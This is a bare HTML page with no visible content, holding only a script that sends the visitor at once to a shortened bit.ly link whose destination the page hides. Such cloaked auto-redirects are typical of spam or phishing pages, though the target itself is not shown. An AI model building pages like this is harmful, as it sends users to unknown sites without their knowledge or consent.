<html>
    
    
    
    <body>
        
        <script type="text/javascript">
window.setTimeout("location=('https://bit.ly/3d2XeUk');", 0);
</script>
    </body>
</html>